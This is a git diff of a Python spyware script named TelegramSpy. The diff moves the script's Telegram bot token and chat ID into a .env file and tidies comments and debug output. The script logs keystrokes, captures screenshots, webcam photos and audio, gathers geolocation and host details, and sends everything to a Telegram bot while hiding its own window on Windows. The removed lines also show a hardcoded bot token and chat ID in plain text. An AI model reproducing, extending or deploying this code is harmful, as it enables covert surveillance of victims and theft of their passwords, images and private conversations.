@@ -11,13 +11,17 @@ import soundfile as sf
 from pynput import keyboard
 from io import BytesIO
 from datetime import datetime
+from dotenv import load_dotenv
+
+# Load sensitive data from .env file
+load_dotenv()
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 # Configuration
-TELEGRAM_TOKEN = "7809591932:AAGNKpxjpfzYIiPc0RlmQBNQ8_KgJJSVdYY"  # Replace with your bot token
-CHAT_ID = "1028586742"  # Replace with your chat ID
-REPORT_INTERVAL = 60  # Seconds between reports
-MAX_LOG_SIZE = 5000  # Max characters before sending logs
-AUDIO_RECORD_SECONDS = 10  # Duration of audio recording
+REPORT_INTERVAL = 60  # Time between logs (in seconds)
+MAX_LOG_SIZE = 5000   # Max keystroke log size before sending
+AUDIO_RECORD_SECONDS = 10  # Duration of audio clip (in seconds)
 
 class TelegramSpy:
     def __init__(self):
@@ -27,7 +31,7 @@ class TelegramSpy:
         self.last_location = None
 
     def send_to_telegram(self, message, photo=None, document=None):
-        """Send plaintext data to Telegram"""
+        """Send text/photo/document to Telegram"""
         try:
             if photo:
                 photo.seek(0)
@@ -56,7 +60,7 @@ class TelegramSpy:
             return False
 
     def capture_screenshot(self):
-        """Take screenshot and return BytesIO"""
+        """Capture a screenshot and return as BytesIO"""
         try:
             screenshot = pyautogui.screenshot()
             bio = BytesIO()
@@ -69,19 +73,15 @@ class TelegramSpy:
             return None
 
     def capture_webcam(self):
-        """Capture webcam and return BytesIO"""
+        """Capture a webcam photo and return as BytesIO"""
         try:
-            print("Opening webcam...")  # Debugging line
             cam = cv2.VideoCapture(0)
             if not cam.isOpened():
-                print("Failed to open webcam")  # Debugging line
                 return None
             ret, frame = cam.read()
             cam.release()
             if not ret:
-                print("Failed to capture image")  # Debugging line
                 return None
-            print("Webcam image captured successfully")  # Debugging line
             frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
             img = pyautogui.Image.fromarray(frame)
             bio = BytesIO()
@@ -94,12 +94,11 @@ class TelegramSpy:
             return None
 
     def capture_audio(self):
-        """Record audio and return BytesIO"""
+        """Record audio and return as BytesIO"""
         try:
-            print("🎙️ Recording audio...")  # Debugging line
-            fs = 44100  # Sample rate
+            fs = 44100
             recording = sd.rec(int(AUDIO_RECORD_SECONDS * fs), samplerate=fs, channels=2)
-            sd.wait()  # Wait until recording is finished
+            sd.wait()
             bio = BytesIO()
             bio.name = 'audio.wav'
             sf.write(bio, recording, fs, format='WAV')
@@ -110,7 +109,7 @@ class TelegramSpy:
             return None
 
     def get_location(self):
-        """Get geolocation (IP-based)"""
+        """Get IP-based geolocation"""
         try:
             g = geocoder.ip('me')
             if g.ok:
@@ -124,40 +123,36 @@ class TelegramSpy:
                 return self.last_location
         except Exception as e:
             print(f"📍 Geolocation error: {e}")
-            return None
+        return None
 
     def send_initial_data(self):
-        """Immediately send webcam, audio, geolocation, and screenshot"""
+        """Send webcam, screenshot, audio, and location"""
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         location = self.get_location()
 
-        # System Info
-        system_info = (
+        info = (
             f"🚀 **System Activated**\n"
             f"🕒 {timestamp}\n"
             f"💻 {socket.gethostname()} ({os.getlogin()})\n"
             f"🌐 {platform.platform()}\n"
             f"📍 {location.get('address', 'Unknown') if location else 'Unknown'}\n"
         )
-        self.send_to_telegram(system_info)
+        self.send_to_telegram(info)
 
-        # Send Screenshot
         screenshot = self.capture_screenshot()
         if screenshot:
             self.send_to_telegram("🖥️ **Screenshot Captured**", photo=screenshot)
 
-        # Send Webcam Photo
         webcam = self.capture_webcam()
         if webcam:
             self.send_to_telegram("📷 **Webcam Photo Captured**", photo=webcam)
 
-        # Send Audio Recording
         audio = self.capture_audio()
         if audio:
             self.send_to_telegram("🎙️ **Audio Recording**", document=audio)
 
     def on_key_press(self, key):
-        """Log keystrokes in plaintext"""
+        """Log keystrokes and auto-send logs if size exceeded"""
         try:
             self.log += str(key.char)
         except AttributeError:
@@ -170,15 +165,13 @@ class TelegramSpy:
             }
             self.log += special_keys.get(key, f"[{key}]")
 
-        # Auto-send logs if too large
         if len(self.log) > MAX_LOG_SIZE:
             self.send_logs()
 
     def send_logs(self):
-        """Send accumulated logs"""
+        """Send the current keystroke logs"""
         if not self.log:
             return
-
         message = (
             f"📜 **Keystroke Logs**\n"
             f"🔑 Keys pressed:\n{'-'*40}\n"
@@ -186,22 +179,19 @@ class TelegramSpy:
             f"{'-'*40}\n"
         )
         self.send_to_telegram(message)
-        self.log = ""  # Clear logs after sending
+        self.log = ""
         self.last_sent = time.time()
 
     def start(self):
-        """Start monitoring"""
-        # Send initial data (webcam, audio, screenshot, location)
+        """Start the logger and reporting loop"""
         self.send_initial_data()
-
-        # Start keylogger
         with keyboard.Listener(on_press=self.on_key_press) as listener:
             while True:
                 time.sleep(REPORT_INTERVAL)
                 self.send_logs()
 
 if __name__ == "__main__":
-    # Hide window (Windows only)
+    # Hide the terminal window (Windows only)
     if os.name == 'nt':
         try:
             import win32gui, win32con
@@ -209,14 +199,6 @@ if __name__ == "__main__":
         except ImportError:
             print("pywin32 not installed - window will remain visible")
 
-    # Install missing packages
-    try:
-        import cv2, pyautogui, geocoder, sounddevice, soundfile
-    except ImportError:
-        print("Installing required packages...")
-        import subprocess
-        subprocess.check_call(['pip', 'install', 'opencv-python', 'pyautogui', 'geocoder', 'sounddevice', 'soundfile', 'pynput'])
-
-    print("Starting monitoring... (Check Telegram for data)")
+    print("Starting monitoring... (Check Telegram for updates)")
     spy = TelegramSpy()
     spy.start()
